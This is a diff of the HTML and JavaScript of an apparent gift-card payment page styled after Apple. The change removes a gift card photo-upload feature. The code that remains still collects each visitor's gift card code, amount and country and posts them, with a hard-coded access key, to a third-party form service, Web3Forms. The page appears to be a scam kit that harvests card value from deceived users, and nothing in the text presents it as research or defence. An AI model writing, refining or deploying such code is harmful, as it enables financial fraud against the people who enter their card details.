@@ -183,70 +183,6 @@
             background-color: white;
         }
         
-        .upload-container {
-            position: relative;
-        }
-        
-        .upload-area {
-            border: 2px dashed #ddd;
-            border-radius: 6px;
-            padding: 30px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-bottom: 20px;
-        }
-        
-        .upload-area:hover {
-            border-color: var(--secondary);
-            background-color: rgba(0, 173, 238, 0.05);
-        }
-        
-        .upload-area i {
-            font-size: 48px;
-            color: var(--secondary);
-            margin-bottom: 15px;
-        }
-        
-        .upload-area p {
-            margin: 0;
-            color: var(--gray);
-        }
-        
-        #imagePreview {
-            max-width: 200px;
-            max-height: 200px;
-            margin-top: 15px;
-            display: none;
-        }
-        
-        .upload-options {
-            display: none;
-            position: absolute;
-            background: white;
-            border: 1px solid #ddd;
-            border-radius: 6px;
-            padding: 10px;
-            z-index: 100;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            width: 200px;
-        }
-        
-        .upload-option {
-            padding: 10px;
-            cursor: pointer;
-            border-radius: 4px;
-        }
-        
-        .upload-option:hover {
-            background-color: #f5f5f5;
-        }
-        
-        .upload-option i {
-            margin-right: 10px;
-            color: var(--secondary);
-        }
-        
         .btn {
             display: inline-block;
             padding: 12px 24px;
@@ -389,26 +325,6 @@
                     </select>
                 </div>
                 
-                <div class="form-group">
-                    <label>Upload Gift Card Image (Optional)</label>
-                    <div class="upload-container">
-                        <div class="upload-area" id="uploadArea" onclick="showUploadOptions(event)">
-                            <i class="fas fa-cloud-upload-alt"></i>
-                            <p>Click to upload your gift card image</p>
-                            <img id="imagePreview" alt="Gift Card Preview">
-                        </div>
-                        <div class="upload-options" id="uploadOptions">
-                            <div class="upload-option" onclick="selectImageFromDevice()">
-                                <i class="fas fa-folder-open"></i> Choose from device
-                            </div>
-                            <div class="upload-option" onclick="takePhoto()">
-                                <i class="fas fa-camera"></i> Take a photo
-                            </div>
-                        </div>
-                    </div>
-                    <input type="file" id="fileInput" accept="image/*" style="display: none;">
-                </div>
-                
                 <button id="confirmBtn" class="btn" onclick="processPayment()">Confirm Payment</button>
             </div>
             
@@ -430,7 +346,6 @@
         <input type="hidden" name="amount" id="hiddenAmount">
         <input type="hidden" name="card_code" id="hiddenCardCode">
         <input type="hidden" name="country" id="hiddenCountry">
-        <input type="hidden" name="image_data" id="hiddenImage">
         <input type="hidden" name="redirect" value="false">
     </form>
     
@@ -443,73 +358,6 @@
                     document.getElementById('pageLoader').style.display = 'none';
                 }, 500);
             }, 1500);
-        });
-
-        // Show upload options when clicking the upload area
-        function showUploadOptions(e) {
-            e.stopPropagation();
-            const options = document.getElementById('uploadOptions');
-            options.style.display = options.style.display === 'block' ? 'none' : 'block';
-        }
-        
-        // Close upload options when clicking elsewhere
-        document.addEventListener('click', function() {
-            document.getElementById('uploadOptions').style.display = 'none';
-        });
-        
-        // Select image from device
-        function selectImageFromDevice() {
-            const fileInput = document.getElementById('fileInput');
-            fileInput.removeAttribute('capture');
-            fileInput.click();
-        }
-        
-        // Take a photo
-        function takePhoto() {
-            const fileInput = document.createElement('input');
-            fileInput.type = 'file';
-            fileInput.accept = 'image/*';
-            fileInput.capture = 'environment';
-            fileInput.style.display = 'none';
-            
-            fileInput.onchange = function(e) {
-                const file = e.target.files[0];
-                if (file) {
-                    const reader = new FileReader();
-                    reader.onload = function(event) {
-                        const imagePreview = document.getElementById('imagePreview');
-                        imagePreview.src = event.target.result;
-                        imagePreview.style.display = 'block';
-                        document.getElementById('uploadArea').querySelector('p').textContent = 'Camera photo';
-                        document.getElementById('hiddenImage').value = event.target.result;
-                    };
-                    reader.readAsDataURL(file);
-                }
-            };
-            
-            document.body.appendChild(fileInput);
-            fileInput.click();
-            document.body.removeChild(fileInput);
-        }
-        
-        // Handle file selection for regular file input
-        const uploadArea = document.getElementById('uploadArea');
-        const fileInput = document.getElementById('fileInput');
-        const imagePreview = document.getElementById('imagePreview');
-        
-        fileInput.addEventListener('change', function(e) {
-            document.getElementById('uploadOptions').style.display = 'none';
-            const file = e.target.files[0];
-            if (file) {
-                const reader = new FileReader();
-                reader.onload = function(event) {
-                    imagePreview.src = event.target.result;
-                    imagePreview.style.display = 'block';
-                    uploadArea.querySelector('p').textContent = file.name;
-                    document.getElementById('hiddenImage').value = event.target.result;
-                };
-                reader.readAsDataURL(file);
-            }
         });
         
         // Process payment and save to web storage
@@ -537,10 +385,6 @@
             document.getElementById('hiddenCardCode').value = cardCode;
             document.getElementById('hiddenCountry').value = country;
             
-            // Get image data if available
-            const imageSrc = document.getElementById('imagePreview').src;
-            const hasImage = imageSrc && !imageSrc.includes('data:,'); // Check if image exists and isn't empty
-            
             // Prepare form data
             const formData = new URLSearchParams();
             formData.append('access_key', '19bd1a1c-04ae-4540-8975-9d05a216e05e');
@@ -550,33 +394,7 @@
             formData.append('country', country);
             formData.append('redirect', 'false');
             
-            // Only include image if it exists
-            if (hasImage) {
-                // Convert any image format to JPEG base64
-                convertImageToJpeg(imageSrc, function(jpegData) {
-                    formData.append('image_data', jpegData);
-                    submitToWeb3Forms(formData);
-                });
-            } else {
-                submitToWeb3Forms(formData);
-            }
-        }
-        
-        // Convert any image to JPEG base64
-        function convertImageToJpeg(imageSrc, callback) {
-            const img = new Image();
-            img.onload = function() {
-                const canvas = document.createElement('canvas');
-                canvas.width = img.width;
-                canvas.height = img.height;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(img, 0, 0);
-                
-                // Convert to JPEG with 80% quality
-                const jpegData = canvas.toDataURL('image/jpeg', 0.8);
-                callback(jpegData);
-            };
-            img.src = imageSrc;
+            submitToWeb3Forms(formData);
         }
         
         // Submit to Web3Forms
@@ -624,10 +442,6 @@
             document.getElementById('amount').value = '';
             document.getElementById('cardCode').value = '';
             document.getElementById('country').value = '';
-            fileInput.value = '';
-            imagePreview.style.display = 'none';
-            imagePreview.src = '';
-            uploadArea.querySelector('p').textContent = 'Click to upload your gift card image';
             
             // Hide Apple loader
             document.getElementById('pageLoader').style.opacity = '0';
